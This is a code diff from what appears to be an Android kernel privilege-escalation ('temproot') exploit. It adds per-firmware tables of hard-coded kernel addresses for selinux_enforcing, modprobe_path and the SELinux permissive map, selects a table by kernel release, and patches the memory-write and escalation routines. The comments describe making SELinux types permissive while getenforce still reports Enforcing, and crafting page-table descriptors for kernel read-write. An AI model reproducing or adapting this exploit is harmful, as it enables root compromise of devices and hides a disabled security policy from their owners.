@@ -472,13 +472,65 @@ int main(int argc, char **argv)
  * ------------------------------------------------------------------------ */
 #include <stdarg.h>
 
-/* No KASLR on this build, and both targets are the same addresses every boot
- * (three cold-boot runs).  Values must stay in step with tools/run_temproot.sh. */
-#define ENFORCE_ADDR   0xffffffc00189be74UL
-#define MODPROBE_ADDR  0xffffffc001635a30UL
+/* No KASLR on any supported build, and the targets are the same addresses every boot.
+ * Which set applies is per-firmware now: selection is by the running kernel's own UTS release
+ * (read from /proc/sys/kernel/osrelease, the same source the hpgain arm trusts), and an unknown
+ * build refuses to write instead of guessing -- the rule run_temproot.sh always had, carried by
+ * the binary itself so the APK route inherits it too.  Values must stay in step with
+ * tools/run_temproot.sh and tools/gate_constants.py. */
 #define BADMAGIC       "AAAAAAAA\n"
 
-/* policydb.permissive_map -- measured as policydb(0xffffffc00189f320)+0x1b0 out of this device's own
+struct kprof {
+    const char *osrel;                 /* prefix of uname.release this profile is for */
+    const char *label;                 /* firmware label for the logs */
+    unsigned long enforce, modprobe, perm_map;
+    const unsigned int *exempt; int nexempt;
+};
+#define PROF_601_OSREL   "3.18.20-perf-gb6998a3"   /* 1.15.1 (Android 6.0.1) */
+#define PROF_1712_OSREL  "3.18.20-perf-geb775ef"   /* 1.17.12 (Android 6.0.1, 2017-01-20) */
+#define ENFORCE_ADDR_601   0xffffffc00189be74UL   /* enforcing_setup: str w1,[x0,#0xe74] */
+#define MODPROBE_ADDR_601  0xffffffc001635a30UL   /* unique "/sbin/modprobe" literal under VA=foff+0xffffffc000080000 */
+#define PERM_MAP_ADDR_601  0xffffffc00189f4d0UL   /* policydb 0xffffffc00189f320 + 0x1b0 */
+#define ENFORCE_ADDR_1712  0xffffffc00189cff4UL   /* enforcing_setup: adrp 0xffffffc00189c000 + str w1,[x0,#0xff4] */
+#define MODPROBE_ADDR_1712 0xffffffc001635a30UL   /* same VA as 1.15.1, same literal proof */
+#define PERM_MAP_ADDR_1712 0xffffffc0018a0650UL   /* policydb 0xffffffc0018a04a0 (security_load_policy xref) + 0x1b0 */
+static const unsigned int esc_exempt_601[]  = { 164, 241, 494, 627 }; /* kernel, qti_init_shell, init, untrusted_app (1.15.1 policy) */
+static const unsigned int esc_exempt_1712[] = { 164, 242, 496, 629 }; /* same names, 1.17.12 policy; live /sys/fs/selinux/policy dump and the ramdisk sepolicy parse agree */
+static const struct kprof KPROFILES[] = {
+    { PROF_601_OSREL,  "6.0.1-1.15.1",  ENFORCE_ADDR_601,  MODPROBE_ADDR_601,  PERM_MAP_ADDR_601,  esc_exempt_601,  4 },
+    { PROF_1712_OSREL, "6.0.1-1.17.12", ENFORCE_ADDR_1712, MODPROBE_ADDR_1712, PERM_MAP_ADDR_1712, esc_exempt_1712, 4 },
+};
+static const struct kprof *kp;         /* selected once, on first use */
+static const struct kprof *kp_select(void)
+{
+    char rel[128];
+    FILE *f;
+    size_t i, n;
+    if (kp)
+        return kp;
+    f = fopen("/proc/sys/kernel/osrelease", "r");
+    if (!f)
+        return NULL;
+    n = fread(rel, 1, sizeof rel - 1, f);
+    fclose(f);
+    if (n == 0)
+        return NULL;
+    rel[n] = 0;
+    for (i = 0; i < sizeof KPROFILES / sizeof *KPROFILES; i++) {
+        size_t l = strlen(KPROFILES[i].osrel);
+        if (!strncmp(rel, KPROFILES[i].osrel, l)) {
+            kp = &KPROFILES[i];
+            return kp;
+        }
+    }
+    return NULL;
+}
+#define ENFORCE_ADDR  (kp->enforce)
+#define MODPROBE_ADDR (kp->modprobe)
+#define PERM_MAP_ADDR (kp->perm_map)
+#define MAP_NODE_BASE (kp->modprobe + 0x48)
+
+/* policydb.permissive_map -- 1.15.12-era note: measured as policydb(0xffffffc00189f320)+0x1b0 out of that device's own
  * security_compute_av disassembly, not computed by hand.  Setting a bit here makes that TYPE
  * permissive while selinux_enforcing stays 1, so `getenforce` keeps answering Enforcing.
  * The nodes themselves live in the tail of modprobe_path[] (char[256] at MODPROBE_ADDR): the path
@@ -486,9 +538,6 @@ int main(int argc, char **argv)
  * Byte layout comes from ebitmap_map.h -- the SAME header tools/mapcheck.c compiles on the host to
  * prove these bytes equal the payloads bootstrap3.sh planted on-device (two compilers, two targets,
  * one builder). */
-#define PERM_MAP_ADDR     0xffffffc00189f4d0UL
-#define MAP_NODE_BASE     (MODPROBE_ADDR + 0x48)
-
 /* Type values from tools/_type_values.txt (tools/policy_types.py, positive control
  * qti_init_shell==241, which is the bit measured to exempt the daemon on-device). */
 /* One-line witness of the feed mode, printed by every call: a silent mode bug is
@@ -503,14 +552,17 @@ int esc_write(unsigned long addr, const void *buf, size_t blen, int rounds)
 {
 	WQI = 4;
 	SAFEFED = 0;
+	if (!kp_select())
+		return -1;
 	printf("  esc_write: @%#lx %zu B rounds=%d (WQI=%d SAFEFED=%d)\n", addr, blen, rounds, WQI, SAFEFED);
 	fflush(stdout);
 	return run_rounds(addr, buf, blen, rounds, 0);
 }
 #endif
 
-static const unsigned int esc_exempt[] = { 164, 241, 494, 627 };  /* kernel, qti_init_shell, init, untrusted_app */
-#define NEXEMPT ((int)(sizeof esc_exempt / sizeof *esc_exempt))
+/* The exemption set is the profile's own (esc_exempt_601 / esc_exempt_1712 above). */
+#define esc_exempt (kp->exempt)
+#define NEXEMPT    (kp->nexempt)
 
 struct elog {
     char *buf;
@@ -718,6 +770,14 @@ int esc_escalate_ex(const char *daemon, int rounds, char *out, int cap, int map_
     size_t dlen;
     int rc, r, fd, status, wpid;
     pid_t pid;
+
+    if (!kp_select()) {
+        el(&e, "REFUSE: no route-6 profile for this kernel -- nothing was written "
+               "(supported: " PROF_601_OSREL "*, " PROF_1712_OSREL "*)");
+        return -1;
+    }
+    el(&e, "profile %s: enforce=%#lx modprobe=%#lx perm_map=%#lx exempt=%d bits",
+       kp->label, kp->enforce, kp->modprobe, kp->perm_map, kp->nexempt);
 
     if (rounds <= 0)
         rounds = 24;
@@ -927,6 +987,13 @@ int esc_sugate(char *out, int cap)
     unsigned long gate_alias, enf_alias;
     int r = 24, rc, was, want;
 
+    /* The name-gate arm (SUGATE_*) was derived for the 1.15.1 kernel only; on any other profile
+     * the words it would patch belong to nobody.  Refuse and say what to do instead. */
+    if (!kp_select() || strcmp(kp->osrel, PROF_601_OSREL)) {
+        el(&e, "REFUSE: the su-name gate arm is " PROF_601_OSREL "-only; on %s apps must keep "
+               "calling a renamed client (sux/rootsh)", kp ? kp->label : "this kernel");
+        return -2;
+    }
     gate_alias = sugate_alias(SUGATE_GATE_VA);
     enf_alias = sugate_alias(ENFORCE_ADDR);
     put_le(desc, 0x0040000040000711ULL, 8);   /* PA 0x40000000 | MT_NORMAL,AF,S | EL1 RW | UXN */
